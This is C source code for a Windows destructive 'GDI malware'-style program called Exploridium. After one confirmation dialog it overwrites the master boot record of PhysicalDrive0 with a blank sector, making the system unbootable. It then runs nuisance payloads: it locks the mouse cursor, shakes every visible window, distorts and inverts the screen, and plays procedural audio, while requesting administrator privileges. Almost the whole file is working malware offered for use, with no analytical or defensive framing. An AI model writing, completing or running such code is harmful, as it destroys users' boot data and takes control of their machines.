#include <windows.h>
#include <mmsystem.h>
#include <math.h>

// Link essential Windows multimedia and GDI libraries
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

// --- ADMINISTRATIVE MANIFEST ---
// Force the application to request Administrator privileges on startup
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma comment(linker, "/level='requireAdministrator' uiAccess='false'")

unsigned int t = 0;
bool active = true;
const int PHASE_SAMPLES = 330750; // Standard 30-second phase duration at 11025Hz
const char* m = "B*918/916-918/91B*918/916-918/91>*;2:1;26/;2:1;2A*;291;28/;291;2B*=-;,=-E*>6=4>692>6=4>6D*<3:1<380<3:1<3B(:18/:16.:18/:1";

// --- MBR OVERWRITE PAYLOAD ---
// Warning: This renders the OS unbootable by wiping the first sector of the drive
void OverwriteMBR() {
    DWORD wb; 
    char mbr[512] = {0}; 
    mbr[510] = (char)0x55; // Standard boot signature
    mbr[511] = (char)0xAA;
    
    // Access physical drive 0 (The primary boot drive)
    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (h != INVALID_HANDLE_VALUE) { 
        WriteFile(h, mbr, 512, &wb, NULL); 
        CloseHandle(h); 
    }
}

// --- CURSOR LOCK PAYLOAD ---
// Forces the mouse pointer to the bottom-left corner of the primary monitor
DWORD WINAPI MouseLock(LPVOID lp) {
    int sh = GetSystemMetrics(SM_CYSCREEN);
    while (active) { 
        SetCursorPos(0, sh); 
        Sleep(5); 
    }
    return 0;
}

// --- WINDOW SHAKING CALLBACK ---
// Enumerates all visible windows and moves them slightly in random directions
BOOL CALLBACK ShakeWindows(HWND hwnd, LPARAM lp) {
    if (IsWindowVisible(hwnd)) {
        RECT r; GetWindowRect(hwnd, &r);
        MoveWindow(hwnd, r.left+(rand()%11-5), r.top+(rand()%11-5), r.right-r.left, r.bottom-r.top, TRUE);
    }
    return TRUE;
}

// --- DYNAMIC AUDIO ENGINE ---
// Uses Double Buffering to play procedural Bytebeat music without interruptions
DWORD WINAPI AudioEngine(LPVOID lp) {
    HWAVEOUT hwo; 
    WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0};
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    WAVEHDR hdr[2]; 
    char b[2][5512];
    for (int n=0; n<2; n++) { 
        ZeroMemory(&hdr[n], sizeof(WAVEHDR)); 
        hdr[n].lpData=b[n]; 
        hdr[n].dwBufferLength=5512; 
    }
    
    int bi=0;
    while (active) {
        for (int i=0; i<5512; i++, t++) {
            unsigned char s = 0;
            // Phase-based audio synthesis (Engine -> Distortion -> Melody)
            if (t < PHASE_SAMPLES) s = (t >> (((t%2 ? t%((t>>13)%8>=2 ? ((t>>13)%8>=4 ? 41:51) : 61) : t%34))) | (~t >> 4));
            else if (t < PHASE_SAMPLES*3) s = (unsigned char)((t*t/(1+(t>>9&t>>8)))*6);
            else { 
                double a = 30*t*pow(1.059, (double)(m[(t>>13)%120]/12)); 
                s = (unsigned char)((int)a%255+(int)a%128)/2; 
            }
            b[bi][i] = (char)s;
        }
        waveOutPrepareHeader(hwo, &hdr[bi], sizeof(WAVEHDR)); 
        waveOutWrite(hwo, &hdr[bi], sizeof(WAVEHDR));
        while (!(hdr[bi].dwFlags & WHDR_DONE) && active) Sleep(1);
        waveOutUnprepareHeader(hwo, &hdr[bi], sizeof(WAVEHDR)); 
        bi=(bi+1)%2;
    }
    return 0;
}

int main() {
    // User confirmation before destructive action
    if (MessageBoxA(0, "Proceed with DESTRUCTIVE execution?", "Exploridium", MB_YESNO|MB_ICONWARNING) != IDYES) return 0;
    
    OverwriteMBR(); // <-- DESTRUCTIVE ACTION
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the terminal window
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS); // Boost CPU priority for smooth visual effects
    
    CreateThread(0,0,AudioEngine,0,0,0); 
    CreateThread(0,0,MouseLock,0,0,0);
    
    HDC hdc = GetDC(0); // Get Device Context for the entire screen
    int sw=GetSystemMetrics(0), sh=GetSystemMetrics(1), tx=0, ty=0, dx=20, dy=20;
    
    while (active) {
        if (t < PHASE_SAMPLES*3) { 
            // Effect 1: Sine Jelly - Wavy scanline distortion
            for (int i=0; i<sh; i+=4) BitBlt(hdc, (int)(sin(t/10.0+i/20.0)*15), i, sw, 4, hdc, 0, i, SRCCOPY);
        } else if (t < PHASE_SAMPLES*6) { 
            // Effect 2: Tunneling - Infinite screen zooming effect
            StretchBlt(hdc, 10, 10, sw-20, sh-20, hdc, 0, 0, sw, sh, SRCCOPY);
            if (t%200==0) EnumWindows(ShakeWindows, 0); // Trigger window shaking
        } else { 
            // Effect 3: Bouncing Text & RGB Chaos
            SetBkMode(hdc, 1); 
            SetTextColor(hdc, RGB(rand()%256, rand()%256, rand()%256));
            HFONT hf = CreateFontA(120,0,0,0,700,0,0,0,0,0,0,0,0,"Impact"); 
            SelectObject(hdc, hf);
            
            TextOutA(hdc, tx, ty, "EXPLORIDIUM", 11);
            tx+=dx; ty+=dy; 
            if(tx<0||tx>sw-450) dx=-dx; 
            if(ty<0||ty>sh-120) dy=-dy;
            
            // Invert screen colors randomly based on current buffer
            BitBlt(hdc, rand()%21-10, rand()%21-10, sw, sh, hdc, 0, 0, SRCINVERT); 
            DeleteObject(hf); // Free font memory to prevent GDI leak
        }
        ReleaseDC(0, hdc); // Clean up DC handle
        hdc = GetDC(0); 
        Sleep(5);
    }
    return 0;
}